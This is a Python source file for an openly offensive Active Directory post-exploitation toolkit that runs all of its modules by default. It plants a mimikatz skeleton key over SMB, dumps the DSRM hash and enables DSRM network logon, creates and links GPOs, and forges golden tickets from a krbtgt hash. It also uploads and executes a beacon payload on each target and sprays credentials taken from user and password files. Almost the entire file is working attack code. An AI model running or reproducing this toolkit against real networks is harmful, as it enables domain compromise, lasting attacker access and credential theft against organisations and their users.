#!/usr/bin/env python3
"""
ad_toolkit.py — Consolidated AD post-exploitation toolkit.

By DEFAULT, running with only targets + credentials will execute ALL modules:
  skeleton, dsrm, gpo, golden, beacon

Use --skip-<module> to exclude one (e.g. --skip-beacon --skip-golden).

Module-specific options:
  --skeleton-key       New password for skeleton key (required for skeleton)
  --gpo-name, --gpo-ou, --gpo-action
  --domain-sid, --krbtgt-hash, --target-user, --groups, --out, --extra-sid

Usage: 
python3 ad_toolkit.py 10.0.0.10 \
    --user 'CORP\Administrator' --password 'P@ss' --domain corp.local \
    --skeleton-key 'SkeletonPw!' \
    --gpo-action create --gpo-name 'CorpPolicy' --gpo-ou 'OU=Users,DC=corp,DC=local' \
    --domain-sid S-1-5-21-1111111111-2222222222-3333333333 \
    --krbtgt-hash aabbccddeeff00112233445566778899 \
    --out golden.ccache

# Minimal run — only credentials + IPs. GPO defaults to list, golden+skeleton skip gracefully.
python3 ad_toolkit.py 10.0.0.10 10.0.0.11 --user Administrator --password 'P@ss' --domain corp.local

# Skip beacon but run everything else
python3 ad_toolkit.py 10.0.0.10 --user Administrator --password 'P@ss' --domain corp.local \
    --skeleton-key 'X!' --domain-sid S-1-5-21-... --krbtgt-hash deadbeef... \
    --skip-beacon
"""

import argparse
import os
import re
import subprocess
import sys
import uuid
from pathlib import Path
from typing import Dict, Optional, Tuple

try:
    from colored import Fore
except ImportError:
    class _Fore:
        GREEN = "\033[92m"
        RED = "\033[91m"
        YELLOW = "\033[93m"
        WHITE = "\033[97m"
        RESET = "\033[0m"
    Fore = _Fore()


# ===========================================================================
#  Low-level execution helpers
# ===========================================================================

def execute_powershell(target, username, password, domain, ps_command, use_hash=False):
    cmd = ["nxc", "smb", target, "-u", username, "-d", domain]
    cmd.extend(["-H", password] if use_hash else ["-p", password])
    cmd.extend(["-X", ps_command])
    try:
        r = subprocess.run(cmd, capture_output=True, text=True)
        return r.returncode == 0, r.stdout + r.stderr
    except Exception as e:
        return False, f"Error executing command: {e}"


def execute_cmd(target, username, password, domain, ps_command, use_hash=False):
    cmd = ["nxc", "smb", target, "-u", username, "-d", domain]
    cmd.extend(["-H", password] if use_hash else ["-p", password])
    cmd.extend(["-x", ps_command])
    try:
        r = subprocess.run(cmd, capture_output=True, text=True)
        return r.returncode == 0, r.stdout + r.stderr
    except Exception as e:
        return False, f"Error executing command: {e}"


def run_command(cmd, capture=False, check=False):
    if capture:
        return subprocess.run(cmd, capture_output=True, text=True, check=check)
    return subprocess.run(cmd, check=check)


def drop_mimikatz(user, password, ip):
    smb_command = (
        f"smbclient //{ip}/C$ -U {user}%'{password}' "
        f"-c 'put mimikatz.exe Users\\\\{user}\\\\Desktop\\\\mimikatz.exe'"
    )
    subprocess.run(smb_command, shell=True)


def drop_beacon(target, user, password, domain):
    beacon_name = f"beacon_{uuid.uuid4().hex[:8]}.exe"
    cmd = [
        "smbclient", f"//{target}/C$",
        "-U", f"{user}%{password}",
        "-c", f"put beacon_x64.exe Users\\{user}\\Desktop\\{beacon_name}",
    ]
    subprocess.run(cmd)
    run_cmd = f"cmd /c C:\\Users\\{user}\\Desktop\\{beacon_name}"
    execute_cmd(target, user, password, domain, run_cmd)


# ===========================================================================
#  Module: Skeleton key
# ===========================================================================

def skeleton_mouse(skeleton_key, ip, user, password):
    run_command(["python3", "skeletonkey.py", skeleton_key, "x64/mimikatz.exe", "mimikatz.exe"])
    drop_mimikatz(user, password, ip)

    mimikatz_command = (
        f'nxc smb {ip} -u {user} -p \'{password}\' '
        f'-X "C:\\\\Users\\\\{user}\\\\Desktop\\\\mimikatz.exe '
        f'\\"privilege::debug\\" \\"misc::skeleton\\" \\"exit\\""'
    )
    subprocess.run(mimikatz_command, shell=True)
    run_command(["nxc", "smb", ip, "-u", user, "-p", skeleton_key, "-k"])


# ===========================================================================
#  Module: DSRM
# ===========================================================================

def enable_dsrm_auth(target, username, password, domain, use_hash=False):
    drop_mimikatz(username, password, target)

    cmd_command = (
        rf'C:\Users\{username}\Desktop\mimikatz.exe "token::elevate" '
        rf'"lsadump::sam" "exit" '
        rf'"reg add "HKLM\System\CurrentControlSet\Control\Lsa" '
        rf'/v DsrmAdminLogonBehavior /t REG_DWORD /d 2 /f"'
    )

    print(f"{Fore.YELLOW}[*] Getting DSRM hash")
    print(f"{Fore.YELLOW}[*] Target: {target}")
    print(f"{Fore.YELLOW}[*] Domain: {domain}\\{username}\n")

    success, output = execute_cmd(target, username, password, domain, cmd_command, use_hash)

    if "Hash NTLM" in output:
        print(f"{Fore.GREEN}[+] DSRM Hash:\n")
        ntlm = None
        for line in output.split("\n"):
            if "Hash NTLM" in line:
                ntlm = line.split(":")[-1].strip()
                print(f"{Fore.WHITE} {ntlm}\n")
        return ntlm
    elif "Error" in output:
        print(f"{Fore.RED}[-] Failed to get DSRM Hash")
        m = re.search(r"ERROR_MSG: (.+)", output)
        if m:
            print(f"{Fore.RED} Error: {m.group(1)}")
        return None
    print(f"{Fore.RED}[!] Unexpected output:\n{output}")
    return None


# ===========================================================================
#  Module: GPO
# ===========================================================================

def create_gpo(target, username, password, domain, gpo_name, use_hash=False):
    ps_command = f'''
$ErrorActionPreference = "Stop"
try {{
    Import-Module GroupPolicy
    $gpo = New-GPO -Name "{gpo_name}"
    Write-Host "Success"
    Write-Host "GPO_NAME: $($gpo.DisplayName)"
    Write-Host "GPO_ID: $($gpo.Id)"
    Write-Host "GPO_DOMAIN: $($gpo.DomainName)"
    Write-Host "GPO_PATH: $($gpo.Path)"
}} catch {{
    Write-Host "Error"
    Write-Host "ERROR_MSG: $($_.Exception.Message)"
}}
'''
    print(f"{Fore.YELLOW}[*] Creating GPO: {gpo_name}")
    print(f"{Fore.YELLOW}[*] Target: {target}")
    print(f"{Fore.YELLOW}[*] Domain: {domain}\\{username}\n")

    success, output = execute_powershell(target, username, password, domain, ps_command, use_hash)

    if "Success" in output:
        print(f"{Fore.GREEN}[+] GPO Created Successfully!\n")
        details = {}
        for line in output.split("\n"):
            if line.startswith("GPO_"):
                parts = line.split(":", 1)
                if len(parts) == 2:
                    k = parts[0].replace("GPO_", "").strip()
                    v = parts[1].strip()
                    details[k] = v
                    print(f"{Fore.GREEN} {k}: {v}")
        print()
        return details
    elif "Error" in output:
        print(f"{Fore.RED}[-] Failed to create GPO")
        m = re.search(r"ERROR_MSG: (.+)", output)
        if m:
            print(f"{Fore.RED} Error: {m.group(1)}")
        return None
    print(f"{Fore.RED}[!] Unexpected output creating GPO:\n{output}")
    return None


def link_gpo(target, username, password, domain, gpo_name, ou_path, use_hash=False):
    ps_command = f'''
$ErrorActionPreference = "Stop"
try{{
    Import-Module GroupPolicy
    $link = New-GPLink -Name "{gpo_name}" -Target "{ou_path}" -LinkEnabled Yes
    Write-Host "Success"
    Write-Host "LINK_TARGET: {ou_path}"
    Write-Host "LINK_GPO: {gpo_name}"
    Write-Host "LINK_ORDER: $($link.Order)"
    Write-Host "LINK_ENABLED: $($link.Enabled)"
}} catch {{
    Write-Host "Error"
    Write-Host "ERROR_MSG: $($_.Exception.Message)"
}}
'''
    print(f"{Fore.YELLOW}[*] Linking GPO to OU")
    print(f"{Fore.YELLOW}[*] GPO: {gpo_name}")
    print(f"{Fore.YELLOW}[*] OU: {ou_path}\n")

    success, output = execute_powershell(target, username, password, domain, ps_command, use_hash)

    if "Success" in output:
        print(f"{Fore.GREEN}[+] GPO Linked Successfully!\n")
        for line in output.split("\n"):
            if line.startswith("LINK_"):
                parts = line.split(":", 1)
                if len(parts) == 2:
                    k = parts[0].replace("LINK_", "").strip()
                    v = parts[1].strip()
                    print(f"{Fore.GREEN} {k}: {v}")
        print()
        return True
    print(f"{Fore.RED}[-] Failed to link GPO")
    m = re.search(r"ERROR_MSG: (.+)", output)
    if m:
        print(f"{Fore.RED} Error: {m.group(1)}")
    return False


def list_gpos(target, username, password, domain, use_hash=False):
    ps_command = '''
$ErrorActionPreference = "Stop"
try{
    Import-Module GroupPolicy
    $gpos = Get-GPO -All | Select-Object DisplayName, Id, CreationTime, ModificationTime
    Write-Host "GPO-List"
    foreach ($gpo in $gpos){
        Write-Host "GPO|$($gpo.DisplayName)|$($gpo.Id)|$($gpo.CreationTime)|$($gpo.ModificationTime)"
    }
} catch {
    Write-Host "ERROR: $($_.Exception.Message)"
    exit 1
}
'''
    print(f"{Fore.GREEN}[+] Listing all GPOs...\n")
    success, output = execute_powershell(target, username, password, domain, ps_command, use_hash)

    if "GPO-List" in output:
        for line in output.splitlines():
            if "GPO|" in line:
                clean = line[line.index("GPO|"):]
                parts = clean.split("|")
                if len(parts) >= 4:
                    print(f"{parts[1][:40]:<40} {parts[2]:<38} {parts[3]}")
        print()


def gpoHydra(username, password, use_hash, target, domain, action, ou=None, name=None):
    if action == "create":
        details = create_gpo(target, username, password, domain, name, use_hash)
        if details and ou:
            print()
            link_gpo(target, username, password, domain, name, ou, use_hash)
    elif action == "link":
        link_gpo(target, username, password, domain, name, ou, use_hash)
    elif action == "list":
        list_gpos(target, username, password, domain, use_hash)


# ===========================================================================
#  Module: Golden Ticket
# ===========================================================================

def golden_ticket(domain, domain_sid, krbtgt_hash, target_user,
                  target_groups="512,513,518,519,520", dc_ip=None,
                  out_file="golden.ccache", extra_sid=None):
    print(f"{Fore.YELLOW}[*] Creating Golden Ticket")
    print(f"{Fore.YELLOW}[*] Domain: {domain}")
    print(f"{Fore.YELLOW}[*] Domain SID: {domain_sid}")
    print(f"{Fore.YELLOW}[*] krbtgt hash: {krbtgt_hash[:8]}...")
    print(f"{Fore.YELLOW}[*] Impersonating: {target_user}")
    print(f"{Fore.YELLOW}[*] Groups: {target_groups}")
    print(f"{Fore.YELLOW}[*] Output: {out_file}\n")

    cmd = [
        "ticketer.py", "-n", target_user,
        "-domain", domain, "-domain-sid", domain_sid,
        "-groups", target_groups, "-nthash", krbtgt_hash,
    ]
    if dc_ip:
        cmd.extend(["-dc-ip", dc_ip])
    if extra_sid:
        cmd.extend(["-extra-sid", extra_sid])
    cmd.append(target_user)

    try:
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
        output = r.stdout + r.stderr
        if r.returncode != 0:
            print(f"{Fore.RED}[-] ticketer.py failed (rc={r.returncode})")
            print(output[:600])
            return False

        produced = f"{target_user}.ccache"
        if os.path.isfile(produced) and produced != out_file:
            os.replace(produced, out_file)

        if os.path.isfile(out_file):
            size = os.path.getsize(out_file)
            print(f"{Fore.GREEN}[+] Golden Ticket exported: {out_file} ({size} bytes)")
            print(f"{Fore.GREEN}[+] Use it with: export KRB5CCNAME={os.path.abspath(out_file)}")
            return True
        print(f"{Fore.RED}[!] ticketer reported success but {out_file} not found")
        print(output[:600])
        return False
    except FileNotFoundError:
        print(f"{Fore.RED}[!] ticketer.py not found. Install impacket: pip install impacket")
        return False
    except Exception as e:
        print(f"{Fore.RED}[!] Golden ticket exception: {e}")
        return False


# ===========================================================================
#  Module: Beacon
# ===========================================================================

def run_beacon(target, user, password, domain):
    drop_beacon(target, user, password, domain)


# ===========================================================================
#  Credential / target helpers
# ===========================================================================

def read_credentials(args):
    usernames, passwords = [], []
    if args.user:
        usernames = [args.user]
    elif args.user_file:
        usernames = Path(args.user_file).read_text().splitlines()
    if args.password:
        passwords = [args.password]
    elif args.password_file:
        passwords = Path(args.password_file).read_text().splitlines()
    return [u.strip() for u in usernames if u.strip()], [p.strip() for p in passwords if p.strip()]


def try_credentials(ip, usernames, passwords, fn):
    for user in usernames:
        for pw in passwords:
            print(f"    [*] Trying {user}@{ip}")
            try:
                if fn(ip, user, pw):
                    return True
            except Exception as e:
                print(f"    [!] Error: {e}")
    return False


# ===========================================================================
#  Module runners (each iterates over all IPs unless specified otherwise)
# ===========================================================================

def run_skeleton_all(args, usernames, passwords):
    print(f"\n{'='*60}\n{'SKELETON KEY':^60}\n{'='*60}")
    if not args.skeleton_key:
        print(f"{Fore.RED}[!] --skeleton-key required; skipping skeleton")
        return False
    results = {}
    for ip in args.ips:
        print(f"\n--- skeleton on {ip} ---")
        ok = try_credentials(ip, usernames, passwords,
                             lambda i, u, p: (skeleton_mouse(args.skeleton_key, i, u, p) or True))
        results[ip] = ok
    return all(results.values())


def run_dsrm_all(args, usernames, passwords):
    print(f"\n{'='*60}\n{'DSRM':^60}\n{'='*60}")
    results = {}
    for ip in args.ips:
        print(f"\n--- dsrm on {ip} ---")
        h = {"hash": None}
        ok = try_credentials(ip, usernames, passwords,
                             lambda i, u, p: (h.update(hash=enable_dsrm_auth(i, u, p, args.domain, args.use_hash)) or h["hash"] is not None))
        results[ip] = h["hash"]
    return all(results.values())


def run_gpo_all(args, usernames, passwords):
    print(f"\n{'='*60}\n{'GPO':^60}\n{'='*60}")
    # If not supplied, default to a listing action
    action = args.gpo_action or "list"
    if action in ("create", "link") and not args.gpo_name:
        print(f"{Fore.RED}[!] --gpo-name required for action={action}; defaulting to list")
        action = "list"

    results = {}
    for ip in args.ips:
        print(f"\n--- gpo {action} on {ip} ---")
        ok = try_credentials(ip, usernames, passwords,
                             lambda i, u, p: (gpoHydra(u, p, args.use_hash, i, args.domain,
                                                      action, ou=args.gpo_ou, name=args.gpo_name) or True))
        results[ip] = ok
    return all(results.values())


def run_golden_all(args, usernames, passwords):
    print(f"\n{'='*60}\n{'GOLDEN TICKET':^60}\n{'='*60}")
    if not (args.domain and args.domain_sid and args.krbtgt_hash):
        print(f"{Fore.RED}[!] --domain, --domain-sid, --krbtgt-hash required; skipping golden")
        return False
    return golden_ticket(
        domain=args.domain,
        domain_sid=args.domain_sid,
        krbtgt_hash=args.krbtgt_hash,
        target_user=args.target_user,
        target_groups=args.groups,
        dc_ip=args.dc_ip or args.ips[0],
        out_file=args.out,
        extra_sid=args.extra_sid,
    )


def run_beacon_all(args, usernames, passwords):
    print(f"\n{'='*60}\n{'BEACON':^60}\n{'='*60}")
    results = {}
    for ip in args.ips:
        print(f"\n--- beacon on {ip} ---")
        ok = try_credentials(ip, usernames, passwords,
                             lambda i, u, p: (run_beacon(i, u, p, args.domain) or True))
        results[ip] = ok
    return all(results.values())


# ===========================================================================
#  CLI
# ===========================================================================

def main():
    p = argparse.ArgumentParser(
        description="Consolidated AD post-exploitation toolkit. Runs ALL modules by default "
                    "(skeleton, dsrm, gpo, golden, beacon). Use --skip-X to exclude one."
    )
    p.add_argument("ips", nargs="+", help="Target IP(s), space-separated")
    p.add_argument("--user", help="Auth username")
    p.add_argument("--password", help="Auth password")
    p.add_argument("--user-file", help="File with usernames (one per line)")
    p.add_argument("--password-file", help="File with passwords (one per line)")
    p.add_argument("--domain", default="", help="AD domain (e.g. corp.local)")
    p.add_argument("--use-hash", action="store_true", help="Password arg is NTLM hash")

    # Skeleton
    p.add_argument("--skeleton-key", help="New password for skeleton key")

    # GPO
    p.add_argument("--gpo-action", choices=["create", "link", "list"],
                   default="list", help="GPO action (default: list)")
    p.add_argument("--gpo-name", help="GPO name")
    p.add_argument("--gpo-ou", help="OU path (e.g. 'OU=Users,DC=corp,DC=local')")

    # Golden
    p.add_argument("--domain-sid", help="Domain SID (S-1-5-21-...)")
    p.add_argument("--krbtgt-hash", help="krbtgt NTLM hash")
    p.add_argument("--target-user", default="Administrator", help="User to impersonate")
    p.add_argument("--groups", default="512,513,518,519,520",
                   help="Comma-separated group RIDs")
    p.add_argument("--dc-ip", help="DC IP (defaults to first target)")
    p.add_argument("--out", default="golden.ccache", help="Golden Ticket ccache file")
    p.add_argument("--extra-sid", help="Extra SID to embed")

    # Skip flags
    p.add_argument("--skip-skeleton", action="store_true")
    p.add_argument("--skip-dsrm", action="store_true")
    p.add_argument("--skip-gpo", action="store_true")
    p.add_argument("--skip-golden", action="store_true")
    p.add_argument("--skip-beacon", action="store_true")

    args = p.parse_args()

    usernames, passwords = read_credentials(args)
    if not usernames or not passwords:
        print("[!] Need credentials (--user/--password or file variants)")
        sys.exit(1)

    print(f"{Fore.WHITE}{'='*60}")
    print(f"{Fore.WHITE} AD Toolkit — {len(args.ips)} target(s)")
    print(f"{Fore.WHITE} Credentials: {len(usernames)} user(s) × {len(passwords)} password(s)")
    print(f"{Fore.WHITE}{'='*60}")

    modules = [
        ("skeleton", args.skip_skeleton, run_skeleton_all),
        ("dsrm",     args.skip_dsrm,     run_dsrm_all),
        ("gpo",      args.skip_gpo,      run_gpo_all),
        ("golden",   args.skip_golden,   run_golden_all),
        ("beacon",   args.skip_beacon,   run_beacon_all),
    ]

    summary = {}
    for name, skip, fn in modules:
        if skip:
            print(f"\n[*] Skipping {name} (--skip-{name})")
            summary[name] = "SKIPPED"
            continue
        try:
            ok = fn(args, usernames, passwords)
            summary[name] = "OK" if ok else "FAILED"
        except Exception as e:
            print(f"{Fore.RED}[!] {name} raised: {e}")
            summary[name] = "ERROR"

    print(f"\n{'='*60}\n{'SUMMARY':^60}\n{'='*60}")
    for name, status in summary.items():
        marker = {"OK": "✓", "FAILED": "✗", "SKIPPED": "-", "ERROR": "!"}.get(status, "?")
        color = Fore.GREEN if status == "OK" else (Fore.YELLOW if status == "SKIPPED" else Fore.RED)
        print(f"  {color}{marker} {name:<10} {status}{Fore.RESET}")
    print(f"{'='*60}\n")

    ok_count = sum(1 for s in summary.values() if s == "OK")
    ran = sum(1 for s in summary.values() if s != "SKIPPED")
    sys.exit(0 if ok_count == ran else 1)


if __name__ == "__main__":
    main()